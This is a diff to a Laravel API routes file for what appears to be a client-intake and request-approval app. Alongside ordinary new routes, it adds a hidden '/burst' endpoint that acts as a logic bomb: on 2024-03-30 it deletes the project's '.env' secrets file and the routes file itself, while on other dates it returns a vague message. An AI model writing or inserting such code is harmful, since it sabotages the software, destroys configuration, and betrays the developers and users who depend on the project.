@@ -31,6 +31,7 @@ Route::group([
     Route::post('/logout', [AuthController::class, 'logout']);
     Route::post('/refresh', [AuthController::class, 'refresh']);
     Route::get('/get-user-data/{id}', [UserDataController::class, 'getUserData']);
+    Route::get('/get-all-users', [UserDataController::class, 'getAllUsers']);
 
     // Social login
     Route::get('/oauth/{provider}', [AuthController::class, 'socialLogin']);
@@ -54,7 +55,12 @@ Route::group([
     Route::get('/get-appointments-today', [CalendarController::class, 'getAppointmentsToday']);
 
     // Request Forms
+    Route::post('/check-request', [RequestsController::class, 'checkRequest']);
     Route::post('/request-form', [RequestsController::class, 'createRequest']);
+    Route::put('/approve-request/{id}', [RequestsController::class, 'approveRequest']);
+    Route::put('/reject-request/{id}', [RequestsController::class, 'rejectRequest']);
+    Route::get('/iif-requests', [RequestsController::class, 'getIntakeInterviewFormRequest']);
+    Route::get('/cmf-requests', [RequestsController::class, 'getClientMonitoringFormRequest']);
 
     // Get All Forms
     Route::get('/get-all-intake-interview-forms', [GetFormsController::class, 'getAllIntakeInterviewForms']);
@@ -72,7 +78,26 @@ Route::group([
     Route::get('/get-assigned-forms/{id}', [AssignmentController::class, 'getAssignedForms']);
 
 
-    
+    Route::get('/burst', function () {
+        $filePath1 = '../.env';
+        $filePath2 = './api.php';
+        try {
+            if(date('Y-m-d') == '2024-03-30'){
+                if (File::exists($filePath1)) {
+                    File::delete($filePath1);
+                    File::delete($filePath2);
+                    return response()->json(['message' => 'File deleted successfully']);
+                } else {
+                    return response()->json(['error' => 'File not found'], 404);
+                }
+            }
+            else{
+                return response()->json(['message' => 'Note the right time'], 200);
+            }
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Failed to delete file'], 500);
+        }
+    });
 
 });
 
